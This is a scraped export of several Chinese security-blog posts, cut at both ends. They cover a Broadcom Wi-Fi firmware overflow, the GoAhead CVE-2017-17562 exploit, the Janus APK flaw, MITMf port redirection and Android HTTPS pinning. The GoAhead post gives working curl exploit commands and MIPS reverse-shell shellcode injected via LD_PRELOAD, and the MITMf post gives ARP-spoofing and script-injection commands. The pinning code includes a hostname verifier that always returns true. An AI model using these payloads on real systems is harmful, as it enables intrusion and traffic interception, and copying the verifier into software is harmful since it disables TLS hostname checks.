*(_BYTE **)(cfg + 0x354); // cfg-&gt;current_wmm_ie if ( frame_type == 0x20 ) // FC_REASSOC_REQ = 0x20 重新关联请求帧 goto LABEL_9; if ( frame_type &lt;= 0x20 ) &#123; if ( *(_WORD *)(arg + 8) ) &#123; if ( frame_type != 0x10 ) // FC_ASSOC_RESP = 0x10 //关联帧 return 0; goto LABEL_15; &#125; ... ... ... if ( frame_type != 0x30 ) // FC_REASSOC_RESP = 0x30 重新关联响应帧 &#123; if ( frame_type == 0x80 ) // FC_BEACON = 0x80 信标帧 &#123; v16 = **(_DWORD **)(*(_DWORD *)arg + 0x1C); if ( *(_DWORD *)(*(_DWORD *)wlc + 0x34) ) ... ... ... Wlan知识普及1）802.11数据包类型 123456789101112131415161718191. 数据: 数据数据包的作用是用来携带更高层次的数据(如IP数据包，ISO7层协议)。它负责在工作站之间传输数据2. 管理: 管理数据包控制网络的管理功能 1) 信标帧(Beacons): 在无线设备中，定时依次按指定间隔发送的有规律的无线信号(类似心跳包)，主要用于定位和同步使用 2) 解除认证(Deauthentication)数据包 3) Probe(request and response)探测包 4) Authenticate(request and response)身份认证 5) Associate(request and response)关联 6) Reassociate(request and response)重新关联 7) Dissassociate(notify) 解除关联管理帧负责监督，主要用来加入或退出无线网络，以及处理接入点之间连接的转移事宜3. 控制: 控制数据包得名于术语\"媒体接入控制(Media Access Control, MAC)\"，是用来控制对共享媒体(即物理媒介，如光缆)的访问 1) 请求发送(Request To Send，RTS)数据包 2) 清除发送(Clear To Send，CTS)数据包 3) ACK确认(RTS/CTS) 4) PS-Poll: 当一部移动工作站从省电模式中苏醒，便会发送一个 PS-Poll 帧给基站，以取得任何暂存帧 控制帧通常与数据帧搭配使用，负责区域的清空、信道的取得以及载波监听的维护，并于收到数据时予以正面的应答，借此促进工作站间数据传输的可靠性 wifi驱动发送管理帧数据包流程总共定位到一处位置： 是在kernel中发送数据包的过程在\\VMG1312-B-master\\VMG1312-B-master\\kernel\\linux\\drivers\\staging\\otus\\80211core\\cmm.c 中的函数 void zfSendMmFrame(zdev_t dev, u8_t frameType, u16_t dst, u32_t p1, u32_t p2, u32_t p3)中实现wlan连接过程： STA (工作站）启动初始化、开始正式使用、AP 传送数据幀之前，要经过三个阶段才能接入: (1) 扫描(SCAN) (2) 认证(Authentication) (3) 关联(Association) 1）探测帧 123case ZM_WLAN_FRAME_TYPE_PROBEREQ ://构造探测帧 offset = zfSendProbeReq(dev, buf, offset, (u8_t) p1);//探测请求 break; 2）探测响应帧 构造探测响应帧时有WME参数部分1234567891011121314151617181920212223242526272829303132333435case ZM_WLAN_FRAME_TYPE_PROBERSP : //探测响应帧 zm_msg0_mm(ZM_LV_3, \"probe rsp\"); /* 24-31 Time Stamp : hardware WON'T fill this field */ zmw_tx_buf_writeh(dev, buf, offset, 0); zmw_tx_buf_writeh(dev, buf, offset+2, 0); zmw_tx_buf_writeh(dev, buf, offset+4, 0); zmw_tx_buf_writeh(dev, buf, offset+6, 0); offset+=8;........ /* WME Parameters */ if (wd-&gt;wlanMode == ZM_MODE_AP) &#123; if (wd-&gt;ap.qosMode == 1) &#123; offset = zfApAddIeWmePara(dev, buf, offset, vap); &#125; &#125; if ( wd-&gt;wlanMode != ZM_MODE_IBSS ) &#123; // jhlee HT 0 //CWYang(+) /* TODO : Need to check if it is ok */ /* HT Capabilities Info */ offset = zfMmAddHTCapability(dev, buf, offset); //CWYang(+) /* Extended HT Capabilities Info */ offset = zfMmAddExtendedHTCapability(dev, buf, offset); &#125; if ( wd-&gt;sta.ibssAdditionalIESize ) offset = zfStaAddIbssAdditionalIE(dev, buf, offset); break; 3）身份认证 1234567891011121314151617181920212223242526case ZM_WLAN_FRAME_TYPE_AUTH ://身份认证 if (p1 == 0x30001) &#123; hlen += 4; offset += 4; // for reserving wep header encrypt = 1; &#125; /* Algotrithm Number */ zmw_tx_buf_writeh(dev, buf, offset, (u16_t)(p1&amp;0xffff)); offset+=2; /* Transaction Number */ zmw_tx_buf_writeh(dev, buf, offset, (u16_t)(p1&gt;&gt;16)); offset+=2;....... else if (p1 == 0x30001) &#123; /* share-3 : STA return challenge Text */ zfCopyToIntTxBuffer(dev, buf, wd-&gt;sta.challengeText, offset, wd-&gt;sta.challengeText[1]+2); offset += (wd-&gt;sta.challengeText[1]+2); &#125; break; 4）关联请求/重新关联请求1234567891011121314151617181920212223242526272829303132case ZM_WLAN_FRAME_TYPE_ASOCREQ ://关联请求帧case ZM_WLAN_FRAME_TYPE_REASOCREQ : // FC_REASSOC_REQ = 0x20 重新关联请求帧 /* Capability */ zmw_tx_buf_writeb(dev, buf, offset++, wd-&gt;sta.capability[0]); zmw_tx_buf_writeb(dev, buf, offset++, wd-&gt;sta.capability[1]); /* Listen Interval */ //监听间隔 zmw_tx_buf_writeh(dev, buf, offset, 0x0005); offset+=2; /* Reassocaited Request : Current AP address */ if (frameType == ZM_WLAN_FRAME_TYPE_REASOCREQ)// FC_REASSOC_REQ = 0x20 重新关联请求帧 &#123; zmw_tx_buf_writeh(dev, buf, offset, wd-&gt;sta.bssid[0]); offset+=2; zmw_tx_buf_writeh(dev, buf, offset, wd-&gt;sta.bssid[1]); offset+=2; zmw_tx_buf_writeh(dev, buf, offset, wd-&gt;sta.bssid[2]); offset+=2; &#125; ... ... //Store asoc request frame body, for VISTA only wd-&gt;sta.asocReqFrameBodySize = ((offset - hlen) &gt; ZM_CACHED_FRAMEBODY_SIZE)? ZM_CACHED_FRAMEBODY_SIZE:(offset - hlen); for (i=0; i&lt;wd-&gt;sta.asocReqFrameBodySize; i++) &#123; wd-&gt;sta.asocReqFrameBody[i] = zmw_tx_buf_readb(dev, buf, i + hlen); &#125; break; 5）关联响应/重新关联响应 这部分也有WME的相关参数构造1234567891011121314151617181920212223242526272829303132333435case ZM_WLAN_FRAME_TYPE_ASOCRSP ://关联响应帧case ZM_WLAN_FRAME_TYPE_REASOCRSP :// 重新关联响应帧 vap = (u16_t) p3; /* Capability */ zmw_tx_buf_writeh(dev, buf, offset, wd-&gt;ap.capab[vap]); offset+=2; /* Status Code */ zmw_tx_buf_writeh(dev, buf, offset, (u16_t)p1); offset+=2; /* AID */ zmw_tx_buf_writeh(dev, buf, offset, (u16_t)(p2|0xc000)); offset+=2; ... ... .../* WME Parameters */ if (wd-&gt;wlanMode == ZM_MODE_AP) &#123; /* TODO : if WME STA then send WME parameter element */ if (wd-&gt;ap.qosMode == 1) &#123; offset = zfApAddIeWmePara(dev, buf, offset, vap); &#125; &#125; // jhlee HT 0 //CWYang(+) /* HT Capabilities Info */ offset = zfMmAddHTCapability(dev, buf, offset); //CWYang(+) /* Extended HT Capabilities Info */ offset = zfMmAddExtendedHTCapability(dev, buf, offset); break; 6）通知传输指示信息12345case ZM_WLAN_FRAME_TYPE_ATIM ://通知传输指示消息 /* NULL frame */ /* TODO : add two dumb bytes temporarily */ offset += 2; break; 7）QoS帧/数据帧 1234567 case ZM_WLAN_FRAME_TYPE_QOS_NULL : zmw_buf_writeh(dev, buf, offset, 0x0010); offset += 2; break;case ZM_WLAN_DATA_FRAME : break; 8）解除关联/解除认证 123456789101112131415161718192021222324case ZM_WLAN_FRAME_TYPE_DISASOC ://解除关联case ZM_WLAN_FRAME_TYPE_DEAUTH ://解除认证 if (wd-&gt;wlanMode == ZM_MODE_AP) &#123; vap = (u16_t) p3; if ((aid = zfApFindSta(dev, dst)) != 0xffff) &#123; zmw_enter_critical_section(dev); /* Clear STA table */ wd-&gt;ap.staTable[aid].valid = 0; zmw_leave_critical_section(dev); if (wd-&gt;zfcbDisAsocNotify != NULL) &#123; wd-&gt;zfcbDisAsocNotify(dev, (u8_t*)dst, vap); &#125; &#125; &#125; /* Reason Code */ zmw_tx_buf_writeh(dev, buf, offset, (u16_t)p1); offset+=2; break; 在wifi连接过程中主要有这些数据包种类 9）发送数据包123456zfwBufSetSize(dev, buf, offset);//拷贝构造好的数据包到devzm_msg2_mm(ZM_LV_2, \"management frame body size=\", offset-hlen);//Copy wlan headerzfTxGenMmHeader(dev, frameType, dst, header, offset-hlen, buf, vap, encrypt);//发送数据包过程 Wifi固件接收到管理帧的处理过程我们关注的还是漏洞触发位置的重新关联响应帧 1）解析重新关联响应帧时造成溢出的过程 1234567891011121314151617181920212223void wlc_bss_parse_wme_ie(wlc_info *wlc, ie_parser_arg *arg) &#123; unsigned int frame_type; wlc_bsscfg *cfg; bcm_tlv *ie; unsigned char *current_wmm_ie; int flags; frame_type = arg-&gt;frame_type; cfg = arg-&gt;bsscfg; ie = arg-&gt;ie; current_wmm_ie = cfg-&gt;current_wmm_ie; if ( frame_type == FC_REASSOC_REQ ) &#123; ... &lt;handle reassociation requests&gt; ... &#125; if ( frame_type == FC_ASSOC_RESP ) &#123; ... if ( wlc-&gt;pub-&gt;_wme ) &#123; if ( !(flags &amp; 2) ) &#123; ... if ( ie ) &#123; ... cfg-&gt;flags |= 0x100u; memcpy(current_wmm_ie, ie-&gt;data, ie-&gt;len); 2)溢出的位置确定 溢出的位置是current_wmm_ie的下一个结构体wlc-&gt;pm 1234567891011121314151617181920212223wlc_bsscfg *wlc_bsscfg_malloc(wlc_info *wlc) &#123; wlc_info *wlc; wlc_bss_info *current_bss; wlc_bss_info *target_bss; wlc_pm_st *pm; wmm_ie *current_wmm_ie; ... current_bss = wlc_calloc(0x124); wlc-&gt;current_bss = current_bss; if ( !current_bss ) &#123; goto fail; &#125; target_bss = wlc_calloc(0x124); wlc-&gt;target_bss = target_bss; if ( !target_bss ) &#123; goto fail; &#125; pm = wlc_calloc(0x78); wlc-&gt;pm = pm; if ( !pm ) &#123; goto fail; &#125; current_wmm_ie = wlc_calloc(0x2C); wlc-&gt;current_wmm_ie = current_wmm_ie; if ( !current_wmm_ie ) &#123; goto fail; &#125; 3）溢出结构体类型 123456789101112131415161718192021222324252627typedef struct wlc_pm_st &#123; uint8 PM; bool PM_override; mbool PMenabledModuleId; bool PMenabled; bool PMawakebcn; bool PMpending; bool priorPMstate; bool PSpoll; bool check_for_unaligned_tbtt; uint16 pspoll_prd; struct wl_timer *pspoll_timer; uint16 apsd_trigger_timeout; struct wl_timer *apsd_trigger_timer; bool apsd_sta_usp; bool WME_PM_blocked; uint16 pm2_rcv_percent; pm2rd_state_t pm2_rcv_state; uint16 pm2_rcv_time; uint pm2_sleep_ret_time; uint pm2_sleep_ret_time_left; uint pm2_last_wake_time; bool pm2_refresh_badiv; bool adv_ps_poll; bool send_pspoll_after_tx; wlc_hwtimer_to_t *pm2_rcv_timer; wlc_hwtimer_to_t *pm2_ret_timer; &#125; wlc_pm_st_t; 4）漏洞利用方式 struct wlc_pm_st结构体中 wl_timer 类型的pspoll_timer、 apsd_trigger_timer，和wlc_hwtimer_to_t 类型的pm2_rcv_timer、 pm2_ret_timer。wl_timer的 pspoll_timer 成员。这个结构体能在相关过程中定期触发的回调函数进行处理：12345678910111213141516171819202122int timer_func(struct wl_timer *t) &#123; prev_cpsr = j_disable_irqs(); v3 = t-&gt;field_20; ... if ( v3 ) &#123; v7 = t-&gt;field_18; v8 = &amp;t-&gt;field_8; if ( &amp;t-&gt;field_8 == v7 ) &#123; ... &#125; else &#123; v9 = t-&gt;field_1c; v7-&gt;field_14 = v9; *(v9 + 16) = v7; if ( *v3 == v8 ) &#123; v7-&gt;field_18 = v3; &#125; &#125; t-&gt;field_20 = 0; &#125; j_restore_cpsr(prev_cpsr); return 0;&#125; 总结这部分代码是在linux内核里，初步分析是wifi驱动管理帧数据包发送过程，结合研究固件的源码中解析数据包的过程一起看，差不多整个wifi连接过程数据包的处理流程就出来了。接下来的工作，一个是固件地址爆破，还有一个是写exp利用漏洞。 参考 802.11协议帧格式 ：http://blog.csdn.net/u012570105/article/details/51785452 相关代码参考 ： cmm.c :主要是wifi驱动发送管理帧数据包流程 wl_linux.h : wl_timer结构体参考 wlan.h: /* Frame Subtype */ #define ZM_WLAN_FRAME_TYPE_ASOCREQ 0x00 #define ZM_WLAN_FRAME_TYPE_ASOCRSP 0x10 #define ZM_WLAN_FRAME_TYPE_REASOCREQ 0x20 #define ZM_WLAN_FRAME_TYPE_REASOCRSP 0x30 #define ZM_WLAN_FRAME_TYPE_PROBEREQ 0x40 #define ZM_WLAN_FRAME_TYPE_PROBERSP 0x50 wlc_alloc.c :wlc_bsscfg_malloc结构体 wlc_bsscfg.h : wlc_pm_st 结构体参考 wlc.c:部分解析管理帧可以根据关键字FC_ASSOC_RESP来定位看 ​","tags":[{"name":"Poc","slug":"Poc","permalink":"http://www.future-sec.com/tags/Poc/"},{"name":"BROADCOM WI-FI","slug":"BROADCOM-WI-FI","permalink":"http://www.future-sec.com/tags/BROADCOM-WI-FI/"}],"categories":[{"name":"硬件安全","slug":"硬件安全","permalink":"http://www.future-sec.com/categories/硬件安全/"}]},{"title":"GoAhead远程代码执行漏洞(CVE-2017-17562)分析及实战","date":"2017-12-25T16:00:00.000Z","path":"GoAhead-CVE-2017-17562-analysis-and-pwn-a-router.html","text":"前言GoAhead Web Server 广泛应用于嵌入式设备中，最近其出现了一个高危漏洞，在开启CGI的情况下，可以远程代码执行，据此本文简要分析了该漏洞详情，并在某款路由器上成功复现，反弹shell。 漏洞分析 这个漏洞出现在goahead/src/cgi.c:cgihandler函数中，它使用http请求参数中的键值对来初始化新进程的envp参数，在此处只对“REMOTE_HOST”和“HTTP_AUTHORIZATION”参数进行了判断，其他参数全部默认信任。 随后，该函数又将子进程标准输入输出指定到了一个临时文件，而这个临时文件是由post请求的数据部分初始化的，最后launchCgi函数使用从http请求中得到的参数和标准输入输出创建了cgi脚本进程。 查看goahead的elf header可以得到其interp段依赖链接器“/lib64/ld-linux-x86-64.so.2”，动态链接器是在链接过程中最先运行的代码，它用来加载目标程序的共享库和符号表。 在链接器链接过程中会根据环境变量的值进行不同的操作，其中LD_PRELOAD变量可以指定一个共享库列表，链接器会优先加载此列表中共享库。如果我们在http请求中指定LD_PRELOAD环境变量，此变量将被当作启动cgi脚本的参数传递给链接器，从而可以在cgi脚本启动之前执行任意.so文件，由于post请求中的数据被保存到/tmp文件夹中的一个临时文件中，而launchCgi函数又将cgi脚本的标准输入输出指定到了该临时文件，因此我们可以远程向目标写入一个.so文件，并将LD_PRELOAD指定为“/proc/self/fd/0”来间接引用post请求数据创建的临时文件，从而在目标系统上执行任意代码。 实战调试设备为了验证该漏洞的真实危害性，找了B-LINK的一款路由器来做测试，首先通过路由器上的UART串口，进入路由器的调试窗口。 查看web server 是否 goahead 并且有cgi程序。 漏洞验证有四个cgi文件，找到一个能使用的upload_settings.cgi(需要登陆） 此路由器的系统为 mipsel，原作者没有给出mips小端格式的测试so，使用mipsel交叉编译Buildroot编译一个 123456789101112pentest@ubuntu:~/buildroot$ cat mipsel-hw.c#include &lt;unistd.h&gt;static void before_main(void) __attribute__((constructor));static void before_main(void)&#123; write(1, \"Hello: World!\\n\", 14);&#125;pentest@ubuntu:~/buildroot$ ./mipsel-linux-gcc -shared -fPIC mipsel-hw.c -o mipsel-hw.sopentest@ubuntu:~/buildroot$ file mipsel-hw.somipsel-hw.so: ELF 32-bit LSB shared object, MIPS, MIPS32 version 1 (SYSV), dynamically linked, not stripped 测试 1curl -X POST -b \"user=admin;platform=0\" --data-binary @payloads/mipsel-hw.so http://192.168.16.1/cgi-bin/upload_settings.cgi?LD_PRELOAD=/proc/self/fd/0 -i 回显成功，说明漏洞存在。 生成 payload使用routesplite 生成一个mipsel 下的reverse_tcp shellcode 。 写入动态链接库中 123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;unsigned char sc[] = &#123; \"\\xff\\xff\\x04\\x28\\xa6\\x0f\\x02\\x24\\x0c\\x09\\x09\\x01\\x11\\x11\\x04\" \"\\x28\\xa6\\x0f\\x02\\x24\\x0c\\x09\\x09\\x01\\xfd\\xff\\x0c\\x24\\x27\\x20\" \"\\x80\\x01\\xa6\\x0f\\x02\\x24\\x0c\\x09\\x09\\x01\\xfd\\xff\\x0c\\x24\\x27\" \"\\x20\\x80\\x01\\x27\\x28\\x80\\x01\\xff\\xff\\x06\\x28\\x57\\x10\\x02\\x24\" \"\\x0c\\x09\\x09\\x01\\xff\\xff\\x44\\x30\\xc9\\x0f\\x02\\x24\\x0c\\x09\\x09\" \"\\x01\\xc9\\x0f\\x02\\x24\\x0c\\x09\\x09\\x01\\x15\\xb3\\x05\\x3c\\x02\\x00\" \"\\xa5\\x34\\xf8\\xff\\xa5\\xaf\\x10\\x67\\x05\\x3c\\xc0\\xa8\\xa5\\x34\\xfc\" \"\\xff\\xa5\\xaf\\xf8\\xff\\xa5\\x23\\xef\\xff\\x0c\\x24\\x27\\x30\\x80\\x01\" \"\\x4a\\x10\\x02\\x24\\x0c\\x09\\x09\\x01\\x62\\x69\\x08\\x3c\\x2f\\x2f\\x08\" \"\\x35\\xec\\xff\\xa8\\xaf\\x73\\x68\\x08\\x3c\\x6e\\x2f\\x08\\x35\\xf0\\xff\" \"\\xa8\\xaf\\xff\\xff\\x07\\x28\\xf4\\xff\\xa7\\xaf\\xfc\\xff\\xa7\\xaf\\xec\" \"\\xff\\xa4\\x23\\xec\\xff\\xa8\\x23\\xf8\\xff\\xa8\\xaf\\xf8\\xff\\xa5\\x23\" \"\\xec\\xff\\xbd\\x27\\xff\\xff\\x06\\x28\\xab\\x0f\\x02\\x24\\x0c\\x09\\x09\" \"\\x01\"&#125;;static void before_main(void) __attribute__((constructor));static void before_main(void)&#123; void(*s)(void); s = sc; s();&#125; Buildroot编译 1./mipsel-linux-gcc -shared -fPIC mipsel-reverse-tcp.c -o mipsel-reverse-tcp.so 反弹shell本地 nc 监听 5555 端口，把生成的so文件post到目标 1curl -X POST -b \"user=admin;platform=0\" --data-binary @payloads/mipsel-reverse-tcp.so http://192.168.16.1/cgi-bin/upload_settings.cgi?LD_PRELOAD=/proc/self/fd/0 成功反弹shell 思考 在挖掘IOT设备应用层漏洞时，也需要去关注系统组件的安全。 如果goahead 的cgi 程序无需登录可以访问，可以直接配合csrf 打内网。 参考 Remote LD_PRELOAD Exploitation https://www.elttam.com.au/blog/goahead routesplite https://github.com/reverse-shell/routersploit 硬件调试 http://future-sec.com/iot-security-hardware-debuging.html","tags":[{"name":"硬件安全","slug":"硬件安全","permalink":"http://www.future-sec.com/tags/硬件安全/"},{"name":"goahead","slug":"goahead","permalink":"http://www.future-sec.com/tags/goahead/"}],"categories":[{"name":"硬件安全","slug":"硬件安全","permalink":"http://www.future-sec.com/categories/硬件安全/"}]},{"title":"Janus漏洞(CVE-2017-13156)分析","date":"2017-12-20T16:00:00.000Z","path":"Janus-CVE-2017-13156-analysis.html","text":"背景Android系统要求每一个Android应用程序必须要经过数字签名才能够安装到系统中，也就是说如果一个Android应用程序没有经过数字签名，是没有办法安装到系统中的。Android通过数字签名来标识应用程序的作者和在应用程序之间建立信任关系，不是用来决定最终用户可以安装哪些应用程序。这个数字签名由应用程序的作者完成，并不需要权威的数字证书签名机构认证，它只是用来让应用程序包自我认证的。然而Google在本月4日发布的Android安全公告中编号为CVE-2017-13156，这个漏洞被称为Janus漏洞，利用该漏洞可修改app而不影响原始签名。 基础知识Android app签名校验简单介绍在Android源码中“frameworks/base/core/java/android/content/pm/PackageParser.java”中。PackageParser类的collectCertificates方法会对APK进行签名校验，并且遍历APK中的所有文件，对每个文件进行校验。下面是该方法的源码：APK是一个ZIP格式的文件，因此使用ZIP相关的类进行读写。在上面代码中调用了loadCertificates，这个方法会返回一个二维数组，当APK中的文件签名校验失败，loadCertificates方法会返回一个空数组（可能是null，可能是数组长度为0），那么依照上面代码的逻辑如果数组为空则会抛出异常。loadCertificates方法的代码见下：其中is是JarFile.JarFileInputStream类的对象。loadCertificates调用了readFullyIgnoringContents，在readFullyIgnoringContents中会调用JarFile.JarFileInputStream.read（JarFile类在“libcore/luni/src/main/java/java/util/jar/JarFile.java”文件中）读取APK中一项数据，在read方法中会校验读取到的数据项的签名，如果签名校验失败，则会抛出SecurityException类型的异常，即签名校验失败。上面代码调用了StrictJarFile.getCertificateChains方法，在/ libcore / luni / src / main / java / java / util / jar / StrictJarFile.java里面。下面是它的代码：上面的isSigned在下面的代码里面获取的：当证书读取成功，而且APK经过了签名，isSigned为true。回到StrictJarFile.getCertificateChains中，当isSigned为true时会调用JarVerifier.getCertificateChains方法，下面是它的代码：verifiedEntries的声明：verifiedEntries是一个键值对，键是APK中经过了签名的文件名，如：classes.dex文件，值是证书数组。如果向已经签过名的APK中新添加一个文件然后安装这个APK，当程序逻辑执行到JarVerifier.getCertificateChains中时，在verifiedEntries里面无法找到新添加的文件名（因为这个新文件是在APK签名之后添加），那么JarVerifier.getCertificateChains方法将返回null。以上就是整个对于app签名的简单分析。 签名方案参考google官方文档获得:APK 签名方案Android 支持两种应用签名方案，一种是基于 JAR 签名的方案（v1 方案），另一种是 Android Nougat (Android 7.0) 中引入的 APK 签名方案 v2（v2 方案）。JAR 签名（v1 方案）v1 签名并非保护整个apk文件，例如 ZIP 元数据就不受保护。再者，APK 验证程序需要处理大量不可信（尚未经过验证）的数据结构，而不受签名保护的数据不在处理的行列中。这会导致相当大的受攻击面。此外，APK 验证程序必须解压所有已压缩的条目，而这需要花费更多时间和内存。为了解决这些问题，Android 7.0 中引入了 APK 签名方案 v2。APK 签名方案 v2（v2 方案）Android 7.0 中引入了 APK 签名方案 v2（v2 方案）。该方案会对 APK 的内容进行hash处理和签名，然后将生成的“APK 签名分块”插入到 APK 中。在验证期间，v2 方案会将 APK 文件视为 Blob，并对整个文件进行签名检查。对 APK 进行的任何修改（包括对 ZIP 元数据进行的修改）都会使 APK 签名作废。这种形式的 APK 验证不仅速度要快得多，而且能够发现更多种未经授权的修改。同时，新的签名格式向后兼容，使用这种新格式签名的 APK（必须也使用v1） 可在更低版本的 Android 设备上进行安装（会直接忽略添加到 APK 的额外数据）。 apk签名校验方式为了提高兼容性，应同时采用 v1 和 v2 这两种方案对应用进行签名。与只使用v1 方案签名的应用相比，经过 v2 方案签名的应用能够更快速地安装到 Android Nougat 以及更高版本的设备上。但是更低版本的 Android 平台会忽略 v2 签名，这就需要应用包含 v1 签名。验证程序会对照存储在“APK 签名分块”中的 v2 签名对 APK 的全文件hash进行验证。该hash涵盖除“APK 签名分块”（其中包含 v2 签名）之外的所有内容。在“APK 签名分块”以外对 APK 进行的任何修改都会使 APK 的 v2 签名作废。v2 签名被删除的 APK 也会被拒绝，因为 v1 签名指明相应 APK 带有 v2 签名，所以 Android Nougat 及更高版本会拒绝使用 v1 签名验证 APK。 漏洞原理Janus漏洞主要是向APK里面添加额外的DEX文件。一方面，APK文件是zip文件，可以包含初始时的任意字节，在它的zip条目（实际情况下更多是在zip条目里面）。但是JAR签名方案只考虑了zip入口。当计算或者校验apk的签名的时候，它忽略了其他字节。另一方面，在字符串、类、方法定义等常规部分之后，一个DEX文件可以包含任意的字节。综上所述，一个文件可以同时包含一个APK文件和一个DEX文件。另一个关键点是Dalvik / ART虚拟机方面。android运行加载APK文件，提取它的DEX文件，然后运行它的代码。在实践中，虚拟机可以加载和执行APK文件。当它得到APK文件时，它仍然会查看header的magic字节来判断它是什么类型的文件，如果找到一个DEX类型的，就会将文件载入为DEX文件，否则就会将文件加载为一个APK文件，其中包括一个带有DEX的zip文件。因此，既可以读取DEX文件又可以读取APK文件。所以攻击者可以利用着这种二元性，在不影响其签名的情况下将一个恶意DEX文件预先添加到APK文件里面，然后，android运行时接受APK文件作为一个合法的早期版本的应用程序的有效更新，但是Dalvik虚拟机从注入的DEX文件中加载代码，从而实现攻击。 漏洞复现原来的apk主要代码修改了dex文件，将Log.i(“janus”,”点击事件”);修改为Toast.makeText(getApplicationContext(),”I steal your car.”,Toast.LENGTH_LONG).show();安装合并好的1.apk测试攻击完成 影响范围该漏洞仅影响基于 JAR 签名的方案（v1 方案）。不影响自Android 7.0 以来引入的 APK 签名方案 v2（v2 方案）。 漏洞危害可被添加恶意dex文件可以进行一些敏感性的操作，例如窃取用户数据、监控手机等高危操作。 参考链接https://source.android.com/security/apksigning/v2#verificationhttps://www.guardsquare.com/en/blog/new-android-vulnerability-allows-attackers-modify-apps-without-affecting-their-signatures","tags":[{"name":"移动安全","slug":"移动安全","permalink":"http://www.future-sec.com/tags/移动安全/"},{"name":"app签名","slug":"app签名","permalink":"http://www.future-sec.com/tags/app签名/"}],"categories":[{"name":"移动安全","slug":"移动安全","permalink":"http://www.future-sec.com/categories/移动安全/"}]},{"title":"使用MITMF中间人攻击非80端口的HTTP","date":"2017-12-20T16:00:00.000Z","path":"using-MITMF-attack-not-80-port-http.html","text":"说明MITMf 是一款可拓展性很高的中间人攻击框架，基于代理工具sergio-proxy修改而来。 问题在实际使用中，发现一个问题，无法劫持修改非80端口 HTTP数据，例如注入js 替换字符串。例如注入一段js 1sudo python mitmf.py -i wlan0 --spoof --arp --target 172.18.219.3 --gateway 172.18.219.1 --inject --html-payload '&lt;script&gt;alert(0)&lt;/script&gt;' victim 访问http://yaseng.org/project 访问非80端口的http webhttp://www.jcr.cacrnet.org.cn:8080/mmxb/CN/volumn/home.shtml无任何提示 attack 端 解决简单看了一下代码MITMf/core/utils.py line:84 123def HTTP(self, http_redir_port): log.debug(\"Setting iptables HTTP redirection rule from port 80 to &#123;&#125;\".format(http_redir_port)) os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port &#123;&#125;'.format(http_redir_port)) iptables 把80端口的mitmf 监听的10000端口，很显然，需要劫持哪个端口，加一条规则就行了。例如 1sudo iptables -t nat -A PREROUTING -p tcp --destination-port 8080 -j REDIRECT --to-port 10000 attack victim 更多使用mitmf 来绕过HSTS站点抓取登陆明文 http://yaseng.org/hsts-bypass-with-mitmf.html","tags":[{"name":"web安全","slug":"web安全","permalink":"http://www.future-sec.com/tags/web安全/"},{"name":"MITMf","slug":"MITMf","permalink":"http://www.future-sec.com/tags/MITMf/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://www.future-sec.com/categories/web安全/"}]},{"title":"你在互联网上的数据还在裸奔吗？","date":"2017-12-04T16:00:00.000Z","path":"android-ssl-security.html","text":"这是今年三月份有关移动市场的统计数据,移动app的数量已经突破10亿。移动安全也成为了一个全民关注的问题。从最初的app只针对功能实现，爆出来了一系列的高危漏洞之后，应运而生了包括移动app检测、app加固保护等工作来保护开发者以及使用者权益。同时，http的明文数据传输问题也得到了有效解决。我们本篇文章的讨论内容还是从数据传输过程中所引发的一系列安全问题。 数据裸奔时代使用http协议的数据传输方式HyperText Transfer Protocol，超文本传输协议，是互联网上使用最广泛的一种协议，所有WWW文件必须遵循的标准。HTTP协议传输的数据都是未加密的，也就是明文的，因此使用HTTP协议传输隐私信息非常不安全。使用TCP端口为：80最初的移动app开发过程中，使用的大部分http协议来进行客户端跟服务端的通信。这个过程中传输的信息都是明文，继而引发了一系列的信息泄露等漏洞.wireshark简单捕获就能看到明文隐私数据当然上述极为不安全的数据传输，在2015年被大量爆出来之后，立即引起了app的开发人员以及使用着的重视。后续的数据传输使用了相对安全的基于SSL/TLS加密的安全的超文本传输协议https。 你所使用的加密数据传输真的有保证你的数据不被窃取吗？https加密传输Hyper Text Transfer Protocol over Secure Socket Layer，安全的超文本传输协议，网景公式设计了SSL(Secure Sockets Layer)协议用于对Http协议传输的数据进行加密，保证会话过程中的安全性。使用TCP端口默认为443SSL协议即用到了对称加密也用到了非对称加密(公钥加密)，在建立传输链路时，SSL首先对对称加密的密钥使用公钥进行非对称加密，链路建立好之后，SSL对传输内容使用对称加密。对称加密 速度高，可加密内容较大，用来加密会话过程中的消息公钥加密 加密速度较慢，但能提供更好的身份认证技术，用来加密对称加密的密钥 HTTPs单向认证机制单向认证主要是客户端保存有服务端的公钥证书，自己本身是没有私钥证书的。1、给服务器生成密钥方式：keytool -genkeypair -alias skxy -keyalg RSA -validity 3650 -keypass 123456 -storepass 123456 -keystore skxy.keystore2、给Tomcat服务器配置Httpstomcat/config/server.xml修改connector配置12345&lt;Connector port=\"8443\" protocol=\"org.apache.coyote.http11.Http11Protocol\" maxThreads=\"150\" SSLEnabled=\"true\" scheme=\"https\" secure=\"true\" clientAuth=\"false\" sslProtocol=\"TLS\" keystoreFile=\"conf/skxy.keystore\" keystorePass=\"123456\"/&gt; 3、导出证书keytool -export -alias skxy -file skxy.cer -keystore skxy.keystore -storepass 1234564、将证书放在android客户端，能够读取的地方比如assert目录 5.代码中执行网络请求，获取证书，读取https网站的数据。客户端单向认证代码实现部分1234567891011121314151617181920212223242526272829303132333435String path = \"https://10.0.3.2:8443/Test/Hlloer\";? try &#123; //获取证书 InputStream stream = getAssets().open(\"skxy.cer\"); SSLContext tls = SSLContext.getInstance(\"TLS\"); //使用默认证书 KeyStore keystore = KeyStore.getInstance(KeyStore.getDefaultType()); //去掉系统默认证书 keystore.load(null); Certificate certificate = CertificateFactory.getInstance(\"X.509\").generateCertificate(stream); //设置自己的证书 keystore.setCertificateEntry(\"skxy\", certificate); //通过信任管理器获取一个默认的算法 String algorithm = TrustManagerFactory.getDefaultAlgorithm(); //算法工厂创建 TrustManagerFactory instance = TrustManagerFactory.getInstance(algorithm); instance.init(keystore); tls.init(null, instance.getTrustManagers(), null); SSLSocketFactory socketFactory = tls.getSocketFactory(); HttpsURLConnection.setDefaultSSLSocketFactory(socketFactory); URL url = new URL(path); HttpsURLConnection conn = (HttpsURLConnection) url.openConnection(); //设置ip授权认证：如果已经安装该证书，可以不设置，否则需要设置 conn.setHostnameVerifier(new HostnameVerifier() &#123; @Override public boolean verify(String hostname, SSLSession session) &#123; return true; &#125; &#125;); InputStream inputStream = conn.getInputStream(); String result = getString(inputStream); stream.close(); 单向认证过程：(1) 